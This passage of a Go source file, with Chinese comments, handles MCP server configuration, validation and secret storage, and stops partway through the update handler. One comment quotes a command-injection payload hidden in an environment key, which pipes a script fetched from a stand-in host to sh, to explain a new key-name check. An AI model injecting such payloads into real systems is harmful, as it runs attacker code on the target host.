package app

import (
	"context"
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
)

// MCP（Model Context Protocol）server 配置。
//
// Milevia 以自身数据库为 MCP server 的权威来源，运行时按「项目 + Agent + 目标环境」
// 生成配置并注入 CLI（Claude 走 --mcp-config 临时文件；SSH 走 base64 落盘 + trap 清理）。
// 详细设计与依据见 docs/34-MCP连接与配置调研与实施方案.md。

const (
	mcpTransportStdio = "stdio"
	mcpTransportHTTP  = "http"
	mcpTransportSSE   = "sse"

	mcpScopeGlobal  = "global"
	mcpScopeProject = "project"

	mcpSourceManual       = "manual"
	mcpSourceImport       = "import"
	mcpSourcePreset       = "preset"
	mcpSourceOAuthPending = "oauth-pending"

	// mcpSecretRefPrefix 是环境变量/请求头中加密密钥引用的前缀（复用 profile_secrets）。
	mcpSecretRefPrefix = "sec_"

	// mcpRuntimeDirName 是运行时临时配置目录名，位于私有数据目录下。
	mcpRuntimeDirName = "mcp-runtime"

	// mcpStaleFileTTL 是运行时临时文件的兜底清理阈值（异常退出后由下次启动清理）。
	mcpStaleFileTTL = time.Hour
)

var mcpServerNamePattern = regexp.MustCompile(`^[A-Za-z0-9_-]+$`)

// mcpEnvKeyPattern 约束 MCP 环境变量的**键名**：POSIX 标识符，与
// validateRunEnvironmentVariables 的判据同一份纪律。
//
// 为什么必须单独校验键名：远端（SSH）stdio 探针没有安全 env 通道，env 是以
// `env KEY=VAL` 前缀**内联进交给远端 sh 的脚本**的（见 buildRemoteStdioProbeCommand）。
// 值有 shellQuote 保护，键没有——也**不可能有**：`env 'a b'=v` 本身就非法，加引号救不了。
// 于是一个含 `;` 的键会截断脚本并在目标主机上执行注入命令（2026-09-29 实测，键
// `x;curl http://evil/p|sh;#` 解出的脚本是：
//
//	env NORMAL='ok' x;curl http://evil/p|sh;#='1' 'echo'
//
// ）。"调用方本就能自选 command"不是理由：**导入**路径的 env 键来自第三方配置 JSON，
// 用户在界面上只会审阅 command，不会去逐字看环境变量的键名。
//
// 四道闸门都引用它，各有各的职责，缺一不可：
//  1. mcpServerInput.validate —— 建/改接口，早退并给 400；
//  2. persistImportedCandidate —— 导入路径**不过 validate**（它的 validate 跑在填 Env 之前），
//     而且它会把 buildStoredMaps 的错误统一压成"凭据无法保存"，点名不了是哪个键；
//  3. buildStoredMaps —— 三个写入路径的唯一咽喉，兜住将来新增的写入方；
//  4. probeMCPServer —— 真正的安全边界（库里可能存着本次修复之前写进去的键，草稿压根不落库）。
//
// ⚠️ 这条判据**比"防注入"所需更严**：真正要挡的只是空白、`=`、NUL 与 shell 元字符，
// 而 `env MY-KEY='v'` 在 POSIX 里本来是合法的（只有 `export`/赋值才要求标识符）。
// 之所以仍按 POSIX 标识符收口，是因为**将来可能新增把键当变量名用的路径**
// （`export`、`${VAR}` 占位符、各平台 env 语义…），而一处放宽就得把每一条路径的
// 安全性重新推一遍 —— 这一批修复的教训正是"某个路径上的假设会静默失效"。
// 代价是先前能用的 `MY-KEY` 这类键会被拒（并**点名**那个键），这是有意的取舍。
var mcpEnvKeyPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)

// normalizeMCPEnvKeys 返回键名去掉首尾空白的副本（空输入返回 nil）。
//
// 口径必须跟写入路径（buildStoredMaps 里的 `key = strings.TrimSpace(key)`）：探针若用
// 原样的键，草稿里一个带空格的键会让远端脚本变成 `env   TOKEN  ='v'`，报一句
// `env: 'TOKEN': No such file or directory` —— 用户完全看不出是键名带空格。
//
// ⚠️ 归一化会**折叠同名键**（`{"TOKEN":"a"," TOKEN ":"b"}` 只剩一个）。这里按原始键名
// 排序后取第一个，让结果**可复现**：不加这一步的话取哪个值由 map 迭代顺序决定
// （Go 每次随机），同一次探测重试两次可能用不同的值，排查时无从复现。
// （写入路径同样会折叠，所以探针与库里的口径一致；折叠本身是用户配置有歧义，不是我们的错。）
func normalizeMCPEnvKeys(values map[string]string) map[string]string {
	if len(values) == 0 {
		return nil
	}
	originals := make([]string, 0, len(values))
	for key := range values {
		originals = append(originals, key)
	}
	sort.Strings(originals)
	out := make(map[string]string, len(values))
	for _, key := range originals {
		out[strings.TrimSpace(key)] = values[key]
	}
	return out
}

// invalidMCPEnvKeys 返回不合法的键名（按归一化后的形态判、已排序，便于稳定报错与断言）。
// 合法返回 nil。
func invalidMCPEnvKeys(values map[string]string) []string {
	var bad []string
	for key := range normalizeMCPEnvKeys(values) {
		if !mcpEnvKeyPattern.MatchString(key) {
			bad = append(bad, key)
		}
	}
	sort.Strings(bad)
	return bad
}

// mcpEnvKeyError 把非法键名转成一条可读结论（四个闸门共用，措辞只此一份）。
func mcpEnvKeyError(values map[string]string) error {
	bad := invalidMCPEnvKeys(values)
	if len(bad) == 0 {
		return nil
	}
	// 空键在文案里给一个看得懂的标签：直接拼会出现"环境变量名不合法：。"
	labels := make([]string, 0, len(bad))
	for _, key := range bad {
		if key == "" {
			labels = append(labels, "（空）")
			continue
		}
		labels = append(labels, key)
	}
	return fmt.Errorf("环境变量名不合法：%s。只允许字母、数字与下划线，且不能以数字开头"+
		"（远端探测会把环境变量内联进 shell 脚本，键名必须是合法的 POSIX 变量名）", strings.Join(labels, "、"))
}

// mcpServer 是一条 MCP server 定义。密钥字段（Env/Headers 中）在库内统一存 sec_ 引用，
// 明文只在写入瞬间存在，读取与列表接口永不回显明文。
type mcpServer struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	DisplayName string `json:"displayName"`
	Description string `json:"description"`
	Transport   string `json:"transport"`

	Command string            `json:"command,omitempty"`
	Args    []string          `json:"args,omitempty"`
	Env     map[string]string `json:"env,omitempty"`
	Cwd     string            `json:"cwd,omitempty"`

	URL     string            `json:"url,omitempty"`
	Headers map[string]string `json:"headers,omitempty"`

	Scope        string   `json:"scope"`
	ProjectID    string   `json:"projectId,omitempty"`
	Environments []string `json:"environments"`
	Agents       []string `json:"agents"`

	Enabled           bool     `json:"enabled"`
	AutoApproveTools  []string `json:"autoApproveTools,omitempty"`
	StartupTimeoutSec int      `json:"startupTimeoutSec"`
	ToolTimeoutSec    int      `json:"toolTimeoutSec"`

	Source    string    `json:"source"`
	CreatedAt time.Time `json:"createdAt"`
	UpdatedAt time.Time `json:"updatedAt"`

	// 读接口专用：Env/Headers 中属于加密引用的键名（明文永不回显）。
	EnvSecretKeys    []string `json:"envSecretKeys,omitempty"`
	HeaderSecretKeys []string `json:"headerSecretKeys,omitempty"`
}

func migrateMCPServers(ctx context.Context, db *sql.DB) error {
	if _, err := db.ExecContext(ctx, `create table if not exists mcp_servers (
		id                  text primary key,
		name                text not null,
		display_name        text not null default '',
		description         text not null default '',
		transport           text not null,
		command             text not null default '',
		args_json           text not null default '[]',
		env_json            text not null default '{}',
		cwd                 text not null default '',
		url                 text not null default '',
		headers_json        text not null default '{}',
		scope               text not null default 'global',
		project_id          text not null default '',
		environments        text not null default '["windows","wsl","remote-linux"]',
		agents              text not null default '["claude-code"]',
		enabled             integer not null default 1,
		auto_approve_tools  text not null default '[]',
		startup_timeout_sec integer not null default 20,
		tool_timeout_sec    integer not null default 60,
		source              text not null default 'manual',
		created_at          datetime not null,
		updated_at          datetime not null
	)`); err != nil {
		return fmt.Errorf("create mcp_servers: %w", err)
	}
	if _, err := db.ExecContext(ctx, `create unique index if not exists ux_mcp_servers_scope_name on mcp_servers(scope, project_id, name)`); err != nil {
		return fmt.Errorf("index mcp_servers: %w", err)
	}
	if _, err := db.ExecContext(ctx, `create index if not exists mcp_servers_scope_project on mcp_servers(scope, project_id, enabled)`); err != nil {
		return fmt.Errorf("index mcp_servers scope: %w", err)
	}
	return nil
}

// registerMCPRoutes 挂载 MCP 管理接口。自动继承 routes() 上的 requireSession。
func (s *Server) registerMCPRoutes(r chi.Router) {
	r.Get("/api/mcp/servers", s.listMCPServers)
	r.Post("/api/mcp/servers", s.createMCPServer)
	r.Get("/api/mcp/servers/{serverID}", s.getMCPServer)
	r.Patch("/api/mcp/servers/{serverID}", s.updateMCPServer)
	r.Delete("/api/mcp/servers/{serverID}", s.deleteMCPServer)
	r.Get("/api/mcp/presets", s.listMCPPresets)
	r.Post("/api/mcp/servers/{serverID}/test", s.testMCPServer)
	// 按环境预览占位符解析结果（保存前调用，故走表单字段而非 serverID）。
	r.Post("/api/mcp/preview", s.previewMCPServer)
	// 在目标环境检查模板声明的运行时依赖是否存在（同样是保存前调用）。
	r.Post("/api/mcp/runtime-check", s.checkMCPRuntimes)
	// 保存前试连一条尚未落库的配置（「一键连接」向导的最后一步）。
	r.Post("/api/mcp/test-draft", s.testMCPDraft)
	r.Post("/api/mcp/import", s.importMCPServers)
	r.Put("/api/mcp/servers/{serverID}/auto-approve", s.updateMCPServerAutoApprove)
	// 远程 MCP 的 OAuth 2.1 授权（P2）。回调由浏览器直接跳转，故在 requireSession 中放行。
	r.Post("/api/mcp/servers/{serverID}/oauth/start", s.startMCPServerOAuth)
	r.Get("/api/mcp/servers/{serverID}/oauth", s.getMCPServerOAuth)
	r.Delete("/api/mcp/servers/{serverID}/oauth", s.deleteMCPServerOAuth)
	r.Get("/api/mcp/oauth/flows/{flowID}", s.getMCPOAuthFlow)
	r.Delete("/api/mcp/oauth/flows/{flowID}", s.cancelMCPOAuthFlow)
	r.Get(mcpOAuthCallbackPath, s.handleMCPOAuthCallback)
	r.Get("/api/mcp/oauth/prepare/{flowID}", s.mcpOAuthPreparePage)
	r.Get("/api/mcp/oauth/prepare/{flowID}/status", s.mcpOAuthPrepareStatus)
	// 调用审计（P2）。
	r.Get("/api/mcp/audit", s.listMCPCallAudit)
	r.Delete("/api/mcp/audit", s.clearMCPCallAudit)
	r.Get("/api/projects/{projectID}/mcp", s.getProjectMCP)
	r.Patch("/api/projects/{projectID}/mcp", s.patchProjectMCP)
	r.Get("/api/projects/{projectID}/mcp/status", s.getProjectMCPStatus)
}

// mcpServerInput 是写入接口的请求体。密钥通过 envSecrets/headerSecrets 明文传入，
// 服务端加密为 sec_ 引用后并入 env/headers；env/headers 中已存在的 sec_ 引用原样保留。
type mcpServerInput struct {
	OAuthPending bool   `json:"oauthPending"`
	Name         string `json:"name"`
	// DisplayName / Description 用指针区分「未提供」与「显式清空」：整表 PATCH 是部分
	// 更新语义，卡片开关只发 {enabled}，绝不能把没传的说明当成空串覆盖掉。
	DisplayName *string `json:"displayName"`
	Description *string `json:"description"`
	Transport   string  `json:"transport"`

	Command string            `json:"command"`
	Args    []string          `json:"args"`
	Env     map[string]string `json:"env"`
	Cwd     string            `json:"cwd"`

	URL     string            `json:"url"`
	Headers map[string]string `json:"headers"`

	EnvSecrets    map[string]string `json:"envSecrets"`
	HeaderSecrets map[string]string `json:"headerSecrets"`
	// RemovedEnvSecrets / RemovedHeaderSecrets 是表单上显式「移除」的已保存凭据键。
	// 密钥值永不回显，前端无法用「值是否为空」表达删除，必须单独给键名。
	RemovedEnvSecrets    []string `json:"removedEnvSecrets"`
	RemovedHeaderSecrets []string `json:"removedHeaderSecrets"`

	Scope        string   `json:"scope"`
	ProjectID    string   `json:"projectId"`
	Environments []string `json:"environments"`
	Agents       []string `json:"agents"`

	Enabled           *bool    `json:"enabled"`
	AutoApproveTools  []string `json:"autoApproveTools"`
	StartupTimeoutSec *int     `json:"startupTimeoutSec"`
	ToolTimeoutSec    *int     `json:"toolTimeoutSec"`
}

// mcpAutoApproveInput 是工具级免审批白名单的写入体。
type mcpAutoApproveInput struct {
	Patterns []string `json:"patterns"`
}

var mcpValidEnvironments = map[string]bool{
	string(agentTargetEnvWindows): true,
	string(agentTargetEnvWSL):     true,
	string(agentTargetEnvRemote):  true,
	// 兼容前端可能传入的旧字面量。
	"remote": true,
}

func normalizeMCPEnvironments(values []string) []string {
	seen := map[string]bool{}
	out := []string{}
	for _, v := range values {
		v = strings.TrimSpace(v)
		if v == "remote" {
			v = string(agentTargetEnvRemote)
		}
		if !mcpValidEnvironments[v] || seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
	}
	sort.Strings(out)
	return out
}

func normalizeMCPAgents(values []string) []string {
	seen := map[string]bool{}
	out := []string{}
	for _, v := range values {
		v = strings.TrimSpace(v)
		if !validProfileAgent(v) {
			continue
		}
		if seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
	}
	sort.Strings(out)
	return out
}

func (input *mcpServerInput) normalize() {
	input.Name = strings.TrimSpace(input.Name)
	if input.DisplayName != nil {
		trimmed := strings.TrimSpace(*input.DisplayName)
		input.DisplayName = &trimmed
	}
	if input.Description != nil {
		trimmed := strings.TrimSpace(*input.Description)
		input.Description = &trimmed
	}
	input.Transport = strings.TrimSpace(strings.ToLower(input.Transport))
	input.Command = strings.TrimSpace(input.Command)
	input.Cwd = strings.TrimSpace(input.Cwd)
	input.URL = strings.TrimSpace(input.URL)
	input.Scope = strings.TrimSpace(strings.ToLower(input.Scope))
	input.ProjectID = strings.TrimSpace(input.ProjectID)
	if input.Scope == "" {
		input.Scope = mcpScopeGlobal
	}
	if input.Transport == "" {
		input.Transport = mcpTransportStdio
	}
	input.Environments = normalizeMCPEnvironments(input.Environments)
	input.Agents = normalizeMCPAgents(input.Agents)
}

func (input mcpServerInput) validate() error {
	if !mcpServerNamePattern.MatchString(input.Name) {
		return errors.New("MCP server 名称只能包含字母、数字、下划线与连字符")
	}
	switch input.Transport {
	case mcpTransportStdio:
		if input.Command == "" {
			return errors.New("stdio 类型的 MCP server 必须提供启动命令")
		}
	case mcpTransportHTTP, mcpTransportSSE:
		parsed, err := url.Parse(input.URL)
		if err != nil || parsed.Host == "" || (parsed.Scheme != "http" && parsed.Scheme != "https") {
			return errors.New("MCP server 地址必须是合法的 http(s) URL")
		}
	default:
		return errors.New("不支持的 MCP 传输类型")
	}
	switch input.Scope {
	case mcpScopeGlobal:
		if input.ProjectID != "" {
			return errors.New("全局 MCP server 不应绑定项目")
		}
	case mcpScopeProject:
		if input.ProjectID == "" {
			return errors.New("项目级 MCP server 必须指定项目")
		}
	default:
		return errors.New("不支持的 MCP 作用域")
	}
	if len(input.Environments) == 0 {
		return errors.New("MCP server 至少需要一个适用环境")
	}
	if len(input.Agents) == 0 {
		return errors.New("MCP server 至少需要指定一个 Agent")
	}
	// 环境变量**键名**必须在写入这一刻就挡住：它会被内联进远端探针的 shell 脚本
	// （见 mcpEnvKeyPattern）。明文与密文两组键都要查——密文的键同样会当环境变量名用。
	//
	// 注意它也会挡住**老数据**的再保存：库里若存着本次修复之前写进去的非法键（例如更早的
	// 导入带进来的），用户改这个 server 时会被拦下并看到那个键的名字 —— 这是有意的：
	// 那一行本来就发不出去（探针闸门也会拒），改名之后一切照旧。
	if err := mcpEnvKeyError(input.Env); err != nil {
		return err
	}
	return mcpEnvKeyError(input.EnvSecrets)
}

// buildStoredMaps 把明文密钥加密为 sec_ 引用后并入 env/headers。
// 已有 sec_ 引用原样保留；明文覆盖同名引用。
//
// 除显式传入的 envSecrets/headerSecrets 外，普通值里**键名像凭据**的也会自动加密：
// 手动配置表单允许用户把 token 直接粘进环境变量/请求头（UI 明确承诺“保存时自动加密”），
// 若只在 *Secrets 字段里加密，明文会落库并经 GET 与「复制脱敏设置」原样回显。
func (s *Server) buildStoredMaps(ctx context.Context, q secretQueryer, env, headers, envSecrets, headerSecrets map[string]string) (map[string]string, map[string]string, []string, error) {
	// 三个写入路径（建 / 改 / 导入）的唯一咽喉：键名不合法在这里就挡住，将来新增写入方
	// 也自动被兜住。必须挡的原因见 mcpEnvKeyPattern —— 键名会被内联进远端探针的 shell 脚本。
	if err := mcpEnvKeyError(env); err != nil {
		return nil, nil, nil, err
	}
	if err := mcpEnvKeyError(envSecrets); err != nil {
		return nil, nil, nil, err
	}
	created := []string{}
	fail := func(err error) (map[string]string, map[string]string, []string, error) {
		for _, id := range created {
			_ = s.profileSecrets.Revoke(q, ctx, id)
		}
		return nil, nil, nil, err
	}
	store := func(value string) (string, error) {
		ref, err := s.profileSecrets.Store(q, ctx, value)
		if err != nil {
			return "", err
		}
		created = append(created, ref)
		return ref, nil
	}
	// 同一组键里，明文密钥优先于普通值；键名先归一（去首尾空白）并按排序处理，
	// 避免同名键（如 "TOKEN" 与 " TOKEN "）的胜出者取决于 map 迭代顺序。
	merge := func(public, secrets map[string]string) (map[string]string, error) {
		plain := map[string]string{}
		for _, original := range sortedKeys(public) {
			if key := strings.TrimSpace(original); key != "" {
				plain[key] = public[original]
			}
		}
		secret := map[string]string{}
		for _, original := range sortedKeys(secrets) {
			if key := strings.TrimSpace(original); key != "" {
				secret[key] = secrets[original]
			}
		}
		keys := map[string]bool{}
		for key := range plain {
			keys[key] = true
		}
		for key := range secret {
			keys[key] = true
		}
		ordered := make([]string, 0, len(keys))
		for key := range keys {
			ordered = append(ordered, key)
		}
		sort.Strings(ordered)
		out := map[string]string{}
		for _, key := range ordered {
			if value, ok := secret[key]; ok && value != "" {
				ref, err := store(value)
				if err != nil {
					return nil, err
				}
				out[key] = ref
				continue
			}
			value, ok := plain[key]
			if !ok {
				continue
			}
			// 已加密引用原样保留；含 ${VAR} 的值交给 CLI 展开，不替用户决定它是不是密钥。
			if value != "" && !strings.HasPrefix(value, mcpSecretRefPrefix) &&
				!strings.Contains(value, "${") && looksLikeSecretKey(key) {
				ref, err := store(value)
				if err != nil {
					return nil, err
				}
				out[key] = ref
				continue
			}
			out[key] = value
		}
		return out, nil
	}
	stored, err := merge(env, envSecrets)
	if err != nil {
		return fail(err)
	}
	storedHeaders, err := merge(headers, headerSecrets)
	if err != nil {
		return fail(err)
	}
	return stored, storedHeaders, created, nil
}

func marshalStringMap(values map[string]string) (string, error) {
	if len(values) == 0 {
		return "{}", nil
	}
	raw, err := json.Marshal(values)
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

func marshalStringSlice(values []string) (string, error) {
	if values == nil {
		values = []string{}
	}
	raw, err := json.Marshal(values)
	if err != nil {
		return "", err
	}
	return string(raw), nil
}

func unmarshalStringMap(raw string) map[string]string {
	out := map[string]string{}
	if strings.TrimSpace(raw) == "" {
		return out
	}
	if err := json.Unmarshal([]byte(raw), &out); err != nil {
		return map[string]string{}
	}
	return out
}

func unmarshalStringSlice(raw string) []string {
	out := []string{}
	if strings.TrimSpace(raw) == "" {
		return out
	}
	if err := json.Unmarshal([]byte(raw), &out); err != nil {
		return []string{}
	}
	return out
}

// splitSecretKeys 从存储值中剥离 sec_ 引用：返回非密钥部分与密钥键名列表。
// 读接口据此保证明文（以及引用本身）永不回显。
func splitSecretKeys(values map[string]string) (map[string]string, []string) {
	public := map[string]string{}
	secretKeys := []string{}
	for key, value := range values {
		if strings.HasPrefix(value, mcpSecretRefPrefix) {
			secretKeys = append(secretKeys, key)
			continue
		}
		public[key] = value
	}
	sort.Strings(secretKeys)
	if len(public) == 0 {
		public = nil
	}
	return public, secretKeys
}

// mergePublicEnv 用于更新：始终保留 current 中的 sec_ 引用（前端不可见、不可回传）；
// provided 非 nil 时用它替换普通值集合，为 nil 时保留 current 的普通值。
func mergePublicEnv(current, provided map[string]string) map[string]string {
	out := map[string]string{}
	for key, value := range current {
		if strings.HasPrefix(value, mcpSecretRefPrefix) || provided == nil {
			out[key] = value
		}
	}
	for key, value := range provided {
		out[key] = value
	}
	return out
}

func scanMCPServer(row interface {
	Scan(dest ...any) error
}) (mcpServer, error) {
	var server mcpServer
	var argsJSON, envJSON, headersJSON, environmentsJSON, agentsJSON, autoApproveJSON string
	if err := row.Scan(
		&server.ID, &server.Name, &server.DisplayName, &server.Description, &server.Transport,
		&server.Command, &argsJSON, &envJSON, &server.Cwd,
		&server.URL, &headersJSON,
		&server.Scope, &server.ProjectID, &environmentsJSON, &agentsJSON,
		&server.Enabled, &autoApproveJSON, &server.StartupTimeoutSec, &server.ToolTimeoutSec,
		&server.Source, &server.CreatedAt, &server.UpdatedAt,
	); err != nil {
		return mcpServer{}, err
	}
	server.Args = unmarshalStringSlice(argsJSON)
	server.Environments = unmarshalStringSlice(environmentsJSON)
	server.Agents = unmarshalStringSlice(agentsJSON)
	server.AutoApproveTools = unmarshalStringSlice(autoApproveJSON)
	env := unmarshalStringMap(envJSON)
	headers := unmarshalStringMap(headersJSON)
	server.Env, server.EnvSecretKeys = splitSecretKeys(env)
	server.Headers, server.HeaderSecretKeys = splitSecretKeys(headers)
	return server, nil
}

const mcpServerColumns = `id,name,display_name,description,transport,command,args_json,env_json,cwd,url,headers_json,scope,project_id,environments,agents,enabled,auto_approve_tools,startup_timeout_sec,tool_timeout_sec,source,created_at,updated_at`

func (s *Server) listMCPServers(w http.ResponseWriter, r *http.Request) {
	if err := s.cleanupPendingMCPOAuth(r.Context(), time.Now()); err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	query := `select ` + mcpServerColumns + ` from mcp_servers`
	clauses := []string{}
	args := []any{}
	if projectID := strings.TrimSpace(r.URL.Query().Get("projectId")); projectID != "" {
		clauses = append(clauses, `(scope='global' or (scope='project' and project_id=?))`)
		args = append(args, projectID)
	}
	if agentID := strings.TrimSpace(r.URL.Query().Get("agentId")); agentID != "" {
		// agents 存的是 JSON 数组文本；按带引号的完整元素匹配，避免 `code` 命中
		// `codex`、`%`/`_` 当成通配符。非法 Agent ID 直接拒绝，不参与拼条件。
		if !validProfileAgent(agentID) {
			writeError(w, http.StatusBadRequest, errors.New("未知的 Agent"))
			return
		}
		clauses = append(clauses, `agents like ?`)
		args = append(args, `%"`+agentID+`"%`)
	}
	if scope := strings.TrimSpace(r.URL.Query().Get("scope")); scope != "" {
		clauses = append(clauses, `scope=?`)
		args = append(args, scope)
	}
	if len(clauses) > 0 {
		query += " where " + strings.Join(clauses, " and ")
	}
	query += " order by scope, name"
	rows, err := s.db.QueryContext(r.Context(), query, args...)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	defer rows.Close()
	servers := []mcpServer{}
	for rows.Next() {
		server, err := scanMCPServer(rows)
		if err != nil {
			writeError(w, http.StatusInternalServerError, err)
			return
		}
		servers = append(servers, server)
	}
	if err := rows.Err(); err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	writeJSON(w, http.StatusOK, servers)
}

func (s *Server) getMCPServer(w http.ResponseWriter, r *http.Request) {
	serverID := chi.URLParam(r, "serverID")
	server, err := scanMCPServer(s.db.QueryRowContext(r.Context(), `select `+mcpServerColumns+` from mcp_servers where id=?`, serverID))
	if errors.Is(err, sql.ErrNoRows) {
		writeError(w, http.StatusNotFound, errors.New("MCP server not found"))
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	writeJSON(w, http.StatusOK, server)
}

func (s *Server) createMCPServer(w http.ResponseWriter, r *http.Request) {
	var input mcpServerInput
	if !decode(w, r, &input) {
		return
	}
	s.mcpWriteMu.Lock()
	defer s.mcpWriteMu.Unlock()
	input.normalize()
	if err := input.validate(); err != nil {
		writeError(w, http.StatusBadRequest, err)
		return
	}
	patterns, err := normalizeAutoApproveForServer(input.AutoApproveTools, input.Name)
	if err != nil {
		writeError(w, http.StatusBadRequest, err)
		return
	}
	input.AutoApproveTools = patterns
	ctx := r.Context()
	tx, err := s.db.BeginTx(ctx, nil)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	defer tx.Rollback()
	if input.Scope == mcpScopeProject {
		var exists bool
		if err := tx.QueryRowContext(ctx, `select exists(select 1 from projects where id=?)`, input.ProjectID).Scan(&exists); err != nil || !exists {
			writeError(w, http.StatusBadRequest, errors.New("项目不存在"))
			return
		}
	}
	env, headers, createdSecrets, err := s.buildStoredMaps(ctx, tx, input.Env, input.Headers, input.EnvSecrets, input.HeaderSecrets)
	if err != nil {
		writeError(w, http.StatusInternalServerError, errors.New("MCP 凭据无法保存"))
		return
	}
	displayName, description := "", ""
	if input.DisplayName != nil {
		displayName = *input.DisplayName
	}
	if input.Description != nil {
		description = *input.Description
	}
	now := time.Now().UTC()
	server := mcpServer{
		ID:                "mcp_" + uuid.NewString(),
		Name:              input.Name,
		DisplayName:       displayName,
		Description:       description,
		Transport:         input.Transport,
		Command:           input.Command,
		Args:              input.Args,
		Cwd:               input.Cwd,
		URL:               input.URL,
		Scope:             input.Scope,
		ProjectID:         input.ProjectID,
		Environments:      input.Environments,
		Agents:            input.Agents,
		Enabled:           input.Enabled == nil || *input.Enabled,
		AutoApproveTools:  input.AutoApproveTools,
		StartupTimeoutSec: 20,
		ToolTimeoutSec:    60,
		Source:            mcpSourceManual,
		CreatedAt:         now,
		UpdatedAt:         now,
	}
	if input.OAuthPending {
		if server.Transport == "stdio" {
			writeError(w, http.StatusBadRequest, errors.New("只有远程 MCP 可以创建临时授权配置"))
			return
		}
		server.Enabled = false
		server.Source = mcpSourceOAuthPending
		server.AutoApproveTools = []string{}
	}
	if input.StartupTimeoutSec != nil && *input.StartupTimeoutSec > 0 {
		server.StartupTimeoutSec = *input.StartupTimeoutSec
	}
	if input.ToolTimeoutSec != nil && *input.ToolTimeoutSec > 0 {
		server.ToolTimeoutSec = *input.ToolTimeoutSec
	}
	if server.DisplayName == "" {
		server.DisplayName = server.Name
	}
	argsJSON, _ := marshalStringSlice(server.Args)
	envJSON, _ := marshalStringMap(env)
	headersJSON, _ := marshalStringMap(headers)
	environmentsJSON, _ := marshalStringSlice(server.Environments)
	agentsJSON, _ := marshalStringSlice(server.Agents)
	autoApproveJSON, _ := marshalStringSlice(server.AutoApproveTools)
	if _, err := tx.ExecContext(ctx, `insert into mcp_servers (`+mcpServerColumns+`) values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		server.ID, server.Name, server.DisplayName, server.Description, server.Transport,
		server.Command, argsJSON, envJSON, server.Cwd,
		server.URL, headersJSON,
		server.Scope, server.ProjectID, environmentsJSON, agentsJSON,
		server.Enabled, autoApproveJSON, server.StartupTimeoutSec, server.ToolTimeoutSec,
		server.Source, server.CreatedAt, server.UpdatedAt); err != nil {
		for _, id := range createdSecrets {
			_ = s.profileSecrets.Revoke(tx, ctx, id)
		}
		if isUniqueConstraint(err) {
			writeError(w, http.StatusConflict, errors.New("同名 MCP server 已存在（作用域内名称需唯一）"))
			return
		}
		writeError(w, http.StatusBadRequest, err)
		return
	}
	if err := tx.Commit(); err != nil {
		for _, id := range createdSecrets {
			_ = s.profileSecrets.Revoke(s.db, ctx, id)
		}
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	stored, _ := s.fetchMCPServer(ctx, server.ID)
	writeJSON(w, http.StatusCreated, stored)
}

func (s *Server) updateMCPServer(w http.ResponseWriter, r *http.Request) {
	serverID := chi.URLParam(r, "serverID")
	var input mcpServerInput
	if !decode(w, r, &input) {
		return
	}
	s.mcpWriteMu.Lock()
	defer s.mcpWriteMu.Unlock()
	ctx := r.Context()
	current, err := s.fetchStoredMCPServer(ctx, serverID)
	if errors.Is(err, sql.ErrNoRows) {
		writeError(w, http.StatusNotFound, errors.New("MCP server not found"))
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, err)
		return
	}
	merged := mcpServerInput{
		Name:              current.Name,
		DisplayName:       stringPtr(current.DisplayName),
		Description:       stringPtr(current.Description),
		Transport:         current.Transport,
		Command:           current.Command,
		Args:              current.Args,
		Cwd:               current.Cwd,
		URL:               current.URL,
		Scope:             current.Scope,
		ProjectID:         current.ProjectID,
		Environments:      current.Environments,
		Agents:            current.Agents,
		Enabled:           &current.Enabled,
		AutoApproveTools:  current.AutoApproveTools,
		StartupTimeoutSec: &current.StartupTimeoutSec,
		ToolTimeoutSec:    &current.ToolTimeoutSec,
	}
	// 用请求中出现的字段覆盖。字符串字段的「未提供」与「显式清空」必须分开：
	// description 已改成指针；displayName 同样；projectId 的显式清空由 scope 归一兜住。
	if input.Name != "" {
		merged.Name = input.Name
	}
	if input.DisplayName != nil {
		merged.DisplayName = input.DisplayName
	}
	if input.Description != nil {
		merged.Description = input.Description
	}
	if input.Transport != "" {
		merged.Transport = input.Transport
	}
	if input.Command != "" {
		merged.Command = input.Command
	}
	if input.Args != nil {
		merged.Args = input.Args
	}
	if input.Cwd != "" {
		merged.Cwd = input.Cwd
	}
	if input.URL != "" {
		merged.URL = input.URL
	}
	if input.Scope != "" {
		merged.Scope = input.Scope
	}
	if input.ProjectID != "" {
		merged.ProjectID = input.ProjectID
	}
	if input.Environments != nil {
		merged.Environments = input.Environments
	}
	if input.Agents != nil {
		merged.Agents = input.Agents
	}
	if input.Enabled != nil {
		if *input.Enabled && current.Source == mcpSourceOAuthPending {
			writeError(w, http.StatusConflict, errors.New("请先完成授权并通过连接测试"))
			return
		}
		merged.Enabled = input.Enabled
	}
	if input.StartupTimeoutSec != nil && *input.StartupTimeoutSec > 0 {
		merged.StartupTimeoutSec = input.StartupTimeoutSec
	}
	if input.ToolTimeoutSec != nil && *input.ToolTimeoutSec > 0 {
		merged.ToolTimeoutSec = input.ToolTimeoutSec
	}
	// env/headers：保留既有 sec_ 引用，请求给出的普通值整表替换（前端提交完整普通值集合），
	// 密钥明文通过 envSecrets/headerSecrets 新增或覆盖。
	merged.Env = mergePublicEnv(current.envRaw, input.Env)
	merged.Headers = mergePublicEnv(current.headersRaw, input.Headers)
	// 显式移除的已保存凭据：只有该键本次没有重新填写时才删（用户可能在移除后又用
	// 明文/新值加回来）。旧 sec_ 引用由提交后的回收循环吊销。
	// 键名先按 TrimSpace 归一：buildStoredMaps 会把 `" TOKEN "` 写成 `TOKEN`，
	// 用原始 map 键比较会误判为「没重新填写」。
	envProvided := map[string]bool{}
	for key := range input.Env {
		envProvided[strings.TrimSpace(key)] = true
	}
	envSecretProvided := map[string]bool{}
